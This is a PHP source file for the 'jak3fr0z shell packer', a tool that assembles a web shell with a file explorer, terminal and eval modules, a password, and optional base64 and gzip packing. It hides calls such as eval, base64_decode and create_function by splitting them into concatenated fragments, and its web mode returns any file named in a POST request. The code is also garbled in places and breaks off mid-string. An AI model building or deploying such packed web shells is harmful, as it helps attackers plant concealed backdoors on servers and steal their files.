<?php
/*
	jak3fr0z
	Jake Tancinco
	(c)2016
	https://github.com/PhilCodex/jak3fr0z

*/
$GLOBALS['packer']['title'] = "jak3fr0z shell packer";
$GLOBALS['packer']['version'] = "1.4.3";
$GLOBALS['packer']['base_dir'] = "./base/";
$GLOBALS['packer']['module_dir'] = "./module/";
$GLOBALS['packer']['theme_dir'] = "./theme/";
$GLOBALS['packer']['module'] = packer_get_module();
$GLOBALS['packer']['theme'] = packer_get_theme();

require $GLOBALS['packer']['base_dir'].'jsPacker.php';

/* PHP FILES START */
$base_code = "";
$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."resources.php");
$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
$module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
/* PHP FILES END */

/* JAVASCRIPT AND CSS FILES START */
$zepto_code = packer_read_file($GLOBALS['packer']['base_dir']."zepto.js");
$js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js");

$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");


if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
else $theme ="default";
$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");

/* JAVASCRIPT AND CSS FILES END */

// layout
$layout = packer_read_file($GLOBALS['packer']['base_dir']."layout.php");
$p = array_map("rawurldecode", packer_get_post());

if(isset($_SERVER['REMOTE_ADDR'])){
	if(isset($p['read_file'])){
		$file = $p['read_file'];
		if(is_file($file)){
			packer_output(packer_html_safe(packer_read_file($file)));
		}
		packer_output('error');
	}
	elseif(isset($_GET['run'])){
		if(empty($_GET['run'])) $modules = array();
		else $modules = explode("," ,$_GET['run']);
		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);

		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";

		}

		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$content = trim($module_init)."?><?php ".trim($module_init)."?><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?><?php echo $css_code;?><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?><?php echo implode(",", $GLOBALS['packer']['module']);?><?php echo $available_themes; ?><?php echo implode(",", $GLOBALS['packer']['module']);?><?php echo $available_themes; ?><?php echo $zepto_code;?><?php echo $js_main_code;?><?php echo packer_get_self(); ?><?php
	}
}
else{
	$output = $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version']."\n\n";

	if(count($argv)<=1){
		$output .= "options :\n";
		$output .= "\t-o filename\t\t\t\tsave as filename\n";
		$output .= "\t-p password\t\t\t\tprotect with password\n";
		$output .= "\t-t theme\t\t\t\ttheme to use\n";
		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
		$output .= "\t-b\t\t\t\t\tencode with base64\n";
		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
		$output .= "\t-l\t\t\t\t\tlist available modules\n";
		$output .= "\t-k\t\t\t\t\tlist available themes\n";

	}
	else{
		$opt = getopt("o:p:t:m:sbz:c:lk");

		if(isset($opt['l'])){
			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
			echo $output;
			die();
		}
		
		if(isset($opt['k'])){
			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
			echo $output;
			die();
		}

		if(isset($opt['o'])&&(trim($opt['o'])!='')){
			$outputfile = trim($opt['o']);
		}
		else{
			$output .= "error : no filename given (use -o filename)\n\n";
			echo $output;
			die();
		}

		$password = isset($opt['p'])? trim($opt['p']):"";
		$theme = isset($opt['t'])? trim($opt['t']):"default";
		if(!in_array($theme, $GLOBALS['packer']['theme'])){
			$output .= "error : unknown theme file\n\n";
			echo $output;
			die();
		}
		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
		
		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
		if(empty($modules)) $modules = array();
		else $modules = explode("," ,$modules);

		$strip = isset($opt['s'])? "yes":"no";
		$base64 = isset($opt['b'])? "yes":"no";

		$compress = isset($opt['z'])? trim($opt['z']):"no";
		if(($compress!='gzdeflate')&&($compress!='gzencode')&&($compress!='gzcompress')&&($compress!='no')){
			$output .= "error : unknown options -z ".$compress."\n\n";
			echo $output;
			die();
		}
		else{
			if(($base64=='no')&&($compress!='no')){
				$output .= "error : use -z options only with -b\n\n";
				echo $output;
				die();
			}
		}

		$compress_level = isset($opt['c'])? trim($opt['c']):"";
		if(empty($compress_level)) $compress_level = '9';
		if(!preg_match("/^[0-9]{1}$/", $compress_level)){
			$output .= "error : unknown options -c ".$compress_level." (use only 0-9)\n\n";
			echo $output;
			die();
		}
		$compress_level = (int) $compress_level;

		$output .= "Filename\t\t: ".$outputfile."\n";
		$output .= "Password\t\t: ".$password."\n";
		$output .= "Theme\t\t\t: ".$theme."\n";
		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
		$output .= "Strip\t\t\t: ".$strip."\n";
		$output .= "Base64\t\t\t: ".$base64."\n";
		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";

		$module_arr = array_merge(array("explorer", "terminal", "eval"), $modules);
		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";

		foreach($modules as $module){
			$module = trim($module);
			$filename = $GLOBALS['packer']['module_dir'].$module;
			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
		}

		$layout = str_replace("<__CSS__>", $css_code, $layout);
		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
		
		if($strip=='yes') $js_code = packer_pack_js($js_code);
		$layout = str_replace("<__JS__>", $js_code, $layout);

		$htmlcode = trim($layout);
		$phpcode = "<?php ".trim($module_init)."?><?php
/*
	jak3fr0zshell ".$version."
	Jake Tancinco
	(c)".@date("Y",time())."
	https://github.com/PhilCodEx/jak3fr0z

*/\n";


	if($strip=='yes'){
		$phpcode = packer_strips($phpcode);
		$htmlcode = preg_replace("/(\ {2,}|\n{2,}|\t+)/", "", $htmlcode);
		$htmlcode = preg_replace("/\r/", "", $htmlcode);
		$htmlcode = preg_replace("/}\n+/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+}/", "}", $htmlcode);
		$htmlcode = preg_replace("/\n+{/", "{", $htmlcode);
		$htmlcode = preg_replace("/\n+/", "\n", $htmlcode);
	}


	$content = $phpcode.$htmlcode;

	if($compress=='gzdeflate'){
		$content = gzdeflate($content, $compress_level);
		$encoder_func = "gz'.'in'.'fla'.'te";
	}
	elseif($compress=='gzencode'){
		$content = gzencode($content, $compress_level);
		$encoder_func = "gz'.'de'.'co'.'de";
	}
	elseif($compress=='gzcompress'){
		$content = gzcompress($content, $compress_level);
		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
	}
	else{
		$encoder_func = "";
	}

	if($base64=='yes'){
		$content = base64_encode($content);
		if($compress!='no'){
			$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
		}
		else{
			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
		}

		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$jak3fr0z=\$func('\$x','ev'.'al'.'(\"?>